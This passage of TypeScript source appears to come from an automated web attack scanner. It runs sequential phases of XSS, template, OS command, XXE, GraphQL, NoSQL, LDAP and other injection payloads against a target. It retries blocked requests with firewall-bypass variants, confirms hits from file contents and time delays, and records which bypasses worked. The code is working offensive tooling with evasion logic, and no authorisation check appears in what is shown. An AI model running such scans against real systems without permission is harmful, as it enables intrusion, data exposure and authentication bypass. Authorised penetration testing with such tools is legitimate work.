          if (blocked) { addResult({ technique: "xss-reflected", payload, status: "waf_blocked", statusCode: code, responseTime: rt, evidence: "WAF/Firewall blocked this payload", severity: "info", timestamp: Date.now(), wafDetected: true }); return; }
          const analysis = analyzeXSS(payload, body);
          addResult({ technique: "xss-reflected", payload, status: wafWas && bypassed ? "waf_bypassed" : analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas });
        });
        await delay(60);
      }
    }

    if (techniques.includes("polyglot")) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Polyglot Injection (${POLYGLOT_PAYLOADS.length} payloads) ───────────────────`]);
      for (const payload of POLYGLOT_PAYLOADS) {
        if (!job.active) break;
        await sendWithRetry(payload, "polyglot", (code, body, rt, bypassed, bypassUsed, wafWas) => {
          if (!code) { addResult({ technique: "polyglot", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
          const analysis = analyzeXSS(payload, body);
          addResult({ technique: "polyglot", payload, status: wafWas && bypassed ? "waf_bypassed" : analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: wafWas && bypassed ? "critical" : analysis.severity, timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas });
        });
        await delay(60);
      }
    }

    if (techniques.includes("xss-headers") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: XSS via HTTP Headers (${XSS_HEADER_PAYLOADS.length} headers) ──────────────────`]);
      for (const { header, value } of XSS_HEADER_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, "probe", { [header]: value }, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const analysis = analyzeXSS(value, body);
            addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now() });
            resolve();
          });
        });
        await delay(70);
      }
    }

    if (techniques.includes("ssti") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Server-Side Template Injection (${SSTI_PAYLOADS.length} engines) ──────────────`]);
      for (const { payload, expect, engine } of SSTI_PAYLOADS) {
        if (!job.active) break;
        await sendWithRetry(payload, "ssti", (code, body, rt, bypassed, bypassUsed, wafWas) => {
          if (!code && !body) { addResult({ technique: "ssti", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
          const hit = body.includes(expect);
          addResult({
            technique: "ssti", payload,
            status: hit ? "ssti_hit" : (wafWas && bypassed ? "waf_bypassed" : "not_reflected"),
            statusCode: code, responseTime: rt,
            evidence: hit ? `SSTI CONFIRMED: ${engine} evaluated payload — response contains '${expect}'. Snippet: ${body.slice(0, 400)}` : undefined,
            severity: hit ? "critical" : "info", timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas,
          });
        });
        await delay(100);
      }
    }

    if (techniques.includes("cmdi") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: OS Command Injection (${CMDI_PAYLOADS.length} variants) ─────────────────────`]);
      for (const { payload, expect, desc, timed } of CMDI_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "cmdi", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const wafDetected = isWafBlocked(code, body);
            let hit = false; let evidence = "";
            if (timed) {
              hit = rt >= 4500;
              evidence = hit ? `Time-based command injection confirmed: ${rt}ms delay after SLEEP payload — ${desc}` : "";
            } else {
              const found = (expect as string[]).find((e) => body.includes(e));
              hit = !!found;
              evidence = found ? `Command injection confirmed: '${found}' in response — ${desc}. Snippet: ${body.slice(0, 400)}` : "";
            }
            addResult({ technique: "cmdi", payload, status: hit ? "cmdi_hit" : wafDetected ? "waf_blocked" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? evidence : undefined, severity: hit ? "critical" : "info", timestamp: Date.now(), wafDetected });
            resolve();
          });
        });
        await delay(timed ? 6000 : 100);
      }
    }

    if (techniques.includes("html-injection") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: HTML Injection (${HTML_INJECTION_PAYLOADS.length} payloads) ───────────────────────`]);
      for (const payload of HTML_INJECTION_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "html-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const reflected = body.includes(payload);
            const encoded = body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
            addResult({ technique: "html-injection", payload, status: reflected ? "reflected_unescaped" : encoded ? "reflected_escaped" : "not_reflected", statusCode: code, responseTime: rt, evidence: reflected ? `Raw HTML injected into response — enables phishing/UI redressing attacks` : undefined, severity: reflected ? "high" : encoded ? "medium" : "info", timestamp: Date.now() });
            resolve();
          });
        });
        await delay(70);
      }
    }

    if (techniques.includes("open-redirect") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Open Redirect (${OPEN_REDIRECT_PAYLOADS.length} payloads) ───────────────────────`]);
      for (const payload of OPEN_REDIRECT_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "open-redirect", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const redirectHit = (code >= 301 && code <= 308) || (code === 200 && (body.includes("evil.com") || body.includes(payload)));
            addResult({ technique: "open-redirect", payload, status: redirectHit ? "redirect_hit" : "not_reflected", statusCode: code, responseTime: rt, evidence: redirectHit ? `Open redirect confirmed — server redirected to attacker-controlled URL (HTTP ${code})` : undefined, severity: redirectHit ? "high" : "info", timestamp: Date.now() });
            resolve();
          });
        });
        await delay(70);
      }
    }

    if (techniques.includes("host-header") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Host Header Injection (${HOST_HEADER_PAYLOADS.length} payloads) ────────────────────`]);
      for (const hostVal of HOST_HEADER_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, "probe", { "Host": hostVal, "X-Forwarded-Host": hostVal }, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "host-header", payload: `Host: ${hostVal}`, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const hit = body.includes(hostVal) || body.includes("evil.com") || body.toLowerCase().includes("password reset") || (code >= 200 && code < 400 && body.includes("localhost"));
            addResult({ technique: "host-header", payload: `Host: ${hostVal}`, status: hit ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `Host header injection — server reflected attacker-controlled host value (${hostVal}). Enables cache poisoning, password reset poisoning` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now() });
            resolve();
          });
        });
        await delay(80);
      }
    }

    if (techniques.includes("xxe") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: XXE Injection (${XXE_PAYLOADS.length} payloads) ─────────────────────────────────`]);
      for (const payload of XXE_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, { "Content-Type": "application/xml", "Accept": "application/xml,text/xml,*/*" }, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "xxe", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const hit = body.includes("root:") || body.includes("bin:") || body.includes("PATH=") || body.includes("DOCTYPE") && body.includes("xxe");
            addResult({ technique: "xxe", payload, status: hit ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `XXE CONFIRMED — server parsed XML external entity and returned file contents: ${body.slice(0, 400)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now() });
            resolve();
          }, false, payload);
        });
        await delay(100);
      }
    }

    if (techniques.includes("graphql") && job.active) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: GraphQL Injection (${GRAPHQL_INJECTION_PAYLOADS.length} payloads) ──────────────────────`]);
      const gqlPath = config.path.includes("graphql") ? config.path : "/graphql";
      for (const payload of GRAPHQL_INJECTION_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest({ ...config, path: gqlPath, method: "POST" }, payload, { "Content-Type": "application/json" }, job.trafficLog, (code, body, rt, err) => {
            if (err) { addResult({ technique: "graphql", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
            const hit = body.includes("__schema") || body.includes("__typename") || (body.includes("password") && body.includes("email")) || body.includes("systemInfo");
            addResult({ technique: "graphql", payload, status: hit ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `GraphQL introspection/injection confirmed — schema or sensitive data exposed: ${body.slice(0, 400)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now() });
            resolve();
          }, true, payload);
        });
        await delay(100);
      }
    }

    const advancedMap: Record<string, () => Promise<void>> = {
      "prototype-pollution": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Prototype Pollution (${PROTOTYPE_POLLUTION_PAYLOADS.length} payloads) ────────────────────`]);
        for (const payload of PROTOTYPE_POLLUTION_PAYLOADS) {
          if (!job.active) break;
          await sendWithRetry(payload, "prototype-pollution", (code, body, rt, bypassed, bypassUsed, wafWas) => {
            if (!code && !body) { addResult({ technique: "prototype-pollution", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
            const hit = body.includes("isAdmin") || body.includes('"admin":true') || body.toLowerCase().includes("privilege") || body.includes("constructor");
            addResult({ technique: "prototype-pollution", payload, status: hit ? "executed" : wafWas && bypassed ? "waf_bypassed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `Prototype pollution — server merged attacker properties: ${body.slice(0, 300)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas });
          });
          await delay(70);
        }
      },
      "csti": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Client-Side Template Injection (${CSTI_PAYLOADS.length} payloads) ──────────────────`]);
        for (const payload of CSTI_PAYLOADS) {
          if (!job.active) break;
          await sendWithRetry(payload, "csti", (code, body, rt, bypassed, bypassUsed, wafWas) => {
            if (!code && !body) { addResult({ technique: "csti", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
            const hit = body.includes("49") || body.includes("7777777") || body.includes("uid=");
            addResult({ technique: "csti", payload, status: hit ? "executed" : wafWas && bypassed ? "waf_bypassed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `CSTI CONFIRMED — template engine evaluated attacker payload: ${body.slice(0, 300)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas });
          });
          await delay(70);
        }
      },
      "css-injection": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: CSS Injection (${CSS_INJECTION_PAYLOADS.length} payloads) ──────────────────────────────`]);
        for (const payload of CSS_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "css-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const reflected = body.includes(payload) || body.includes("expression(") || body.includes("@import");
              addResult({ technique: "css-injection", payload, status: reflected ? "reflected_unescaped" : "not_reflected", statusCode: code, responseTime: rt, evidence: reflected ? `CSS injection reflected — data exfiltration or code execution via expression() possible` : undefined, severity: reflected ? "high" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(70);
        }
      },
      "log-injection": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: CRLF / Log Injection (${LOG_INJECTION_PAYLOADS.length} payloads) ──────────────────────`]);
        for (const payload of LOG_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "log-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const reflected = body.includes("injected-header") || body.toLowerCase().includes("logged in") || code === 400 || (body.includes("\r\n") && code >= 200);
              addResult({ technique: "log-injection", payload, status: reflected ? "reflected_unescaped" : "not_reflected", statusCode: code, responseTime: rt, evidence: reflected ? `CRLF injection — log forging or HTTP response splitting confirmed` : undefined, severity: reflected ? "high" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(70);
        }
      },
      "ldap-injection": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: LDAP Injection (${LDAP_INJECTION_PAYLOADS.length} payloads) ──────────────────────────`]);
        for (const payload of LDAP_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "ldap-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const vuln = body.toLowerCase().includes("ldap") || body.toLowerCase().includes("directory") || code === 500 || body.toLowerCase().includes("invalid dn");
              addResult({ technique: "ldap-injection", payload, status: vuln ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `LDAP injection indicator — server may pass input to LDAP query directly: ${body.slice(0, 300)}` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(70);
        }
      },
      "xpath-injection": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: XPath Injection (${XPATH_INJECTION_PAYLOADS.length} payloads) ──────────────────────────`]);
        for (const payload of XPATH_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "xpath-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const vuln = body.toLowerCase().includes("xpath") || body.toLowerCase().includes("xml") || code === 500 || body.toLowerCase().includes("xpathexception");
              addResult({ technique: "xpath-injection", payload, status: vuln ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `XPath injection confirmed — XML/XPath tree extraction possible` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(70);
        }
      },
      "nosql-injection": async () => {
        pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: NoSQL Injection (${NOSQL_PAYLOADS.length} payloads) ──────────────────────────────`]);
        for (const payload of NOSQL_PAYLOADS) {
          if (!job.active) break;
          await sendWithRetry(payload, "nosql-injection", (code, body, rt, bypassed, bypassUsed, wafWas) => {
            if (!code && !body) { addResult({ technique: "nosql-injection", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
            const authBypass = code >= 200 && code < 400 && (body.toLowerCase().includes("dashboard") || body.toLowerCase().includes("token") || body.toLowerCase().includes("welcome"));
            const vuln = authBypass || body.toLowerCase().includes("mongo") || body.toLowerCase().includes("objectid");
            addResult({ technique: "nosql-injection", payload, status: vuln ? "executed" : wafWas && bypassed ? "waf_bypassed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `NoSQL injection — MongoDB operator bypassed auth or returned data: ${body.slice(0, 300)}` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now(), retried: wafWas, bypassUsed, wafDetected: wafWas });
          });
          await delay(70);
        }
      },
    };

    for (const [tech, fn] of Object.entries(advancedMap)) {
      if (techniques.includes(tech) && job.active) await fn();
    }

    const ts9 = tsFmt();
    pushTraffic(job.trafficLog, [
      `[${ts9}] ─── SCAN COMPLETE ────────────────────────────────────────────────────`,
      `[${ts9}] • Total tested: ${job.summary.tested} | Executed: ${job.summary.executed} | Reflected: ${job.summary.reflected}`,
      `[${ts9}] • WAF blocks encountered: ${job.summary.wafBlocked} | Bypasses succeeded: ${job.summary.bypassed}`,
      `[${ts9}] • Working bypass techniques learned: ${job.learning.workingBypass.join(", ") || "none"}`,
      `[${ts9}] ──────────────────────────────────────────────────────────────────────`,
    ]);
    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getInjectionJob(id: string): InjectionJob | undefined {
  return jobs.get(id);
}

export function stopInjectionScan(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
